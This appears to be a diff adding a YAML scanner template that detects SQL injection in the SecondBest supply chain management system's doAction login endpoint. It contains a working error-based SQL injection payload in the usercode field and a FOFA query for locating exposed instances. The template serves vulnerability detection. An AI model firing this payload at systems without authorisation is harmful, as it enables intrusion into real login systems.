@@ -1,0 +1,33 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - body: |
+      {"usercode":"1'+(SELECT CHAR(83)+CHAR(87)+CHAR(119)+CHAR(105) WHERE 6635=6635 AND 2366 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(98)+CHAR(122)+CHAR(113)+(SELECT (CASE WHEN (2366=2366) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(113))))+'","password":"1","remember":false,"ip":null,"city":null,"ISERP":"ISERP"}
+    headers:
+      Content-Type: application/json
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - qbbzq1qxkjq
+        condition: and
+    method: POST
+    path:
+      - '{{BaseURL}}/zh/login/doAction'
+id: secondbest-supply-chain-sqli
+info:
+  author: ZacharyZcR
+  description: |
+    SecondBest Supply Chain Management System has a SQL injection vulnerability in the doAction login interface.
+    The vulnerability exists in the usercode parameter which can be exploited to perform SQL injection attacks.
+    FOFA: app="秒优科技-供应链管理系统"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: SecondBest Supply Chain Management System SQL Injection
+  severity: high
+  tags: secondbest,sqli,argus-import
